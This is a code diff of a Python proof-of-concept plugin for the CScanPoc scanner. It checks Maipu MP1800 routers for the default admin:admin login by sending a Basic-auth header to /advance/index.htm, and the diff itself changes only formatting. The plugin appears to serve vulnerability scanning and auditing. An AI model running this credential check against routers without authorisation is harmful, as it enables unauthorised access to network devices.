@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'MPsec_0003' # 平台漏洞编号，留空
+    vuln_id = 'MPsec_0003'  # 平台漏洞编号，留空
     name = 'MP1800多业务路由器及信息通信网关 默认密码'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-07-24'  # 漏洞公布时间
     desc = '''
         MP1800是迈普公司自主研发的新一代多业务路由器及信息通信网关，它融合了路由技术、交换技术、安全技术、统一通信、存储、视频、3G、WLAN、流量控制、上网行为监管等，是迈普公司打造多业务边缘智能网MeIN（Multi-service Edge-Intelligent Network）的高性能全功能边缘网络设备。
@@ -27,6 +28,7 @@ class Vuln(ABVuln):
     product = '迈普'  # 漏洞应用名称
     product_version = 'MP1800多业务路由器及信息通信网关'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '54a461f3-98f4-4d0c-9251-ccc3a522b655'
     author = '47bwy'  # POC编写者
@@ -39,14 +41,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer     :  http://www.wooyun.org/bugs/wooyun-2015-0129025
+
+            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0129025
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = "/advance/index.htm"
             url = arg + payload
             header = "Authorization: Basic YWRtaW46YWRtaW4="
-            code, head, res, errcode, _ = hh.http(url, header = header )
+            code, head, res, errcode, _ = hh.http(url, header=header)
 
             if code == 200 and 'RES_BUTTON_EXIT' in res:
                 #security_hole(url + "  admin:admin")
@@ -58,6 +60,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
